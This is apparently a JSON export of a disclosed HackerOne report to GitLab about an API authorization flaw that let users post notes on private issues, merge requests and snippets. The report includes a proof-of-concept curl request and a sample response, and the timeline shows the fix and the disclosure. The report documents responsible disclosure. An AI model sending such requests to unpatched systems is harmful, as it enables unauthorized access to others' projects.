{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-05-03T00:55:10.689Z", 
    "voters": [
        "eveeez", 
        "spetr0x", 
        "dyabla", 
        "cryptosector"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 134299, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-05-03T00:59:52.691Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Attacker can post notes on private MR, snippets, and issues", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-06-02T00:55:10.742Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-25T00:37:40.025Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T00:37:40.025Z", 
            "actor": {
                "username": "rspeicher", 
                "url": "/rspeicher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/800/71ae869ab45b05d47a2118c159952ebe3ceca17e_medium.jpg?1519748506"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "@jobert Thanks! Posted at https://gitlab.com/gitlab-org/gitlab-ce/issues/15577, confidential, will post updates here, etc. :)", 
            "markdown_message": "<p><a href=\"/jobert\">@jobert</a> Thanks! Posted at <a title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/15577\" href=\"/redirect?signature=d5f747dfcc9a51d4789bc5119e8923cec6651f5c&amp;url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F15577\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gitlab.com/gitlab-org/gitlab-ce/issues/15577</span><i class=\"icon-external-link\"></i></a>, confidential, will post updates here, etc. :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 925357, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-25T00:38:45.654Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T00:38:45.654Z", 
            "actor": {
                "username": "rspeicher", 
                "url": "/rspeicher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/800/71ae869ab45b05d47a2118c159952ebe3ceca17e_medium.jpg?1519748506"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 925358, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jobert", 
                "url": "/jobert"
            }, 
            "created_at": "2016-05-03T00:52:40.635Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-03T00:52:40.635Z", 
            "actor": {
                "username": "rspeicher", 
                "url": "/rspeicher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/800/71ae869ab45b05d47a2118c159952ebe3ceca17e_medium.jpg?1519748506"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "@jobert The patches that include a fix for this issue [have been released](https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/) and the [acknowledgements page](https://about.gitlab.com/vulnerability-acknowledgements/) has been updated.\n\nFeel free to request public disclosure for this report if you'd like.\n\nThank you again!", 
            "markdown_message": "<p><a href=\"/jobert\">@jobert</a> The patches that include a fix for this issue <a href=\"/redirect?signature=cc3e9965ea083a59971393b7447f5f02b9266a86&amp;url=https%3A%2F%2Fabout.gitlab.com%2F2016%2F05%2F02%2Fcve-2016-4340-patches%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>have been released</span><i class=\"icon-external-link\"></i></a> and the <a href=\"/redirect?signature=e4df4e4ab803154ff3a2f8736ff69952681595f1&amp;url=https%3A%2F%2Fabout.gitlab.com%2Fvulnerability-acknowledgements%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>acknowledgements page</span><i class=\"icon-external-link\"></i></a> has been updated.</p>\n\n<p>Feel free to request public disclosure for this report if you&#39;d like.</p>\n\n<p>Thank you again!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 937747, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-03T00:55:10.711Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-03T00:55:10.711Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 937768, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-03T00:59:52.720Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-03T00:59:52.720Z", 
            "actor": {
                "username": "rspeicher", 
                "url": "/rspeicher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/800/71ae869ab45b05d47a2118c159952ebe3ceca17e_medium.jpg?1519748506"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 937784, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-03T00:59:52.787Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-03T00:59:52.787Z", 
            "actor": {
                "username": "rspeicher", 
                "url": "/rspeicher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/800/71ae869ab45b05d47a2118c159952ebe3ceca17e_medium.jpg?1519748506"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "gitlab", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 937785, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jobert", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jobert", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/002/15c798072d48f06507cde4b11352a3338ae973fc_small.png?1410255083"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 75, 
        "name": "Privilege Escalation"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -79307980.93265484, 
    "disclosed_at": "2016-05-03T00:59:52.762Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/134299", 
    "created_at": "2016-04-25T00:06:12.322Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"vulnerability-details\">Vulnerability details</h1>\n\n<p>By sending a specially crafted request to the GitLab API, an attacker can post notes on merge requests, snippets, and issues it doesn&#39;t have access to. This could execute additional note hooks that were configured by the project administrator.</p>\n\n<h1 id=\"proof-of-concept\">Proof of concept</h1>\n\n<p>As a victim, create a private project. Within this project, create an issue. For this proof of concept, lets state that the issue has ID 1. As an attacker, create a new project that you have access to. In this PoC, the project has ID 2. By referencing a <code>noteable_id</code> (polymorphic relation, can be a MR, snippet, or issue) that doesn&#39;t belong to a project the attacker has access to, notes can be created for objects that the attacker isn&#39;t authorized to access. Here&#39;s a cURL command that references project ID 2 and issue ID 1 (which actually belongs to project ID 1):</p>\n<pre class=\"highlight shell\"><code>curl -X POST --header <span class=\"s2\">&quot;PRIVATE-TOKEN: XXXXXXXXXXXX&quot;</span> <span class=\"s2\">&quot;http://gitlab-instance/api/v3/projects/2/issues/1/notes&quot;</span> --data <span class=\"s2\">&quot;body=@all%20please%20fix%20this.&quot;</span>\n</code></pre>\n<p>The attacker&#39;s private token was used to send this request. It posts a note to the issue with ID 1. This method can also be used to give up and down votes. </p>\n<pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;body&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;@all please fix this.&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;attachment&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;author&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;John Doe&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;username&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;john&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;state&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;active&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;avatar_url&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;http://www.gravatar.com/avatar/8ffb4b6252fa664afc7aeb9f48d1f196?s=80</span><span class=\"se\">\\u</span><span class=\"s2\">0026d=identicon&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;web_url&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;http://gitlab-instance/u/john&quot;</span><span class=\"w\">\n  </span><span class=\"p\">},</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;created_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-04-24T23:40:08.112Z&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;system&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;noteable_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;noteable_type&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;Issue&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;upvote&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;downvote&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<h1 id=\"impact\">Impact</h1>\n\n<p>This vulnerability can be used to scare people because it looks like the unauthorized user has access to the issue, snippet, or merge request. I&#39;ve looked at the notification services to leak the title of the noteable object, but the ACL checks in that class seem to be okay (it doesn&#39;t do anything if the mentioned user doesn&#39;t have access to the project).</p>\n", 
    "vulnerability_information": "# Vulnerability details\nBy sending a specially crafted request to the GitLab API, an attacker can post notes on merge requests, snippets, and issues it doesn't have access to. This could execute additional note hooks that were configured by the project administrator.\n\n# Proof of concept\nAs a victim, create a private project. Within this project, create an issue. For this proof of concept, lets state that the issue has ID 1. As an attacker, create a new project that you have access to. In this PoC, the project has ID 2. By referencing a `noteable_id` (polymorphic relation, can be a MR, snippet, or issue) that doesn't belong to a project the attacker has access to, notes can be created for objects that the attacker isn't authorized to access. Here's a cURL command that references project ID 2 and issue ID 1 (which actually belongs to project ID 1):\n\n```bash\ncurl -X POST --header \"PRIVATE-TOKEN: XXXXXXXXXXXX\" \"http://gitlab-instance/api/v3/projects/2/issues/1/notes\" --data \"body=@all%20please%20fix%20this.\"\n```\n\nThe attacker's private token was used to send this request. It posts a note to the issue with ID 1. This method can also be used to give up and down votes. \n\n```json\n{\n  \"id\":1,\n  \"body\":\"@all please fix this.\",\n  \"attachment\":null,\n  \"author\": {\n    \"name\":\"John Doe\",\n    \"username\":\"john\",\n    \"id\":4,\n    \"state\":\"active\",\n    \"avatar_url\":\"http://www.gravatar.com/avatar/8ffb4b6252fa664afc7aeb9f48d1f196?s=80\\u0026d=identicon\",\n    \"web_url\":\"http://gitlab-instance/u/john\"\n  },\n  \"created_at\":\"2016-04-24T23:40:08.112Z\",\n  \"system\":false,\n  \"noteable_id\":1,\n  \"noteable_type\":\"Issue\",\n  \"upvote\":false,\n  \"downvote\":false\n}\n```\n\n# Impact\nThis vulnerability can be used to scare people because it looks like the unauthorized user has access to the issue, snippet, or merge request. I've looked at the notification services to leak the title of the noteable object, but the ACL checks in that class seem to be okay (it doesn't do anything if the mentioned user doesn't have access to the project).", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://about.gitlab.com", 
            "about": "Open source software to collaborate on code", 
            "twitter_handle": "gitlab", 
            "name": "GitLab"
        }, 
        "handle": "gitlab", 
        "url": "https://hackerone.com/gitlab", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/264/338ec4b43393873324e3f1911f2f107d025d13f1_small.png?1454722206", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 264, 
        "default_currency": "usd"
    }, 
    "is_published": false
}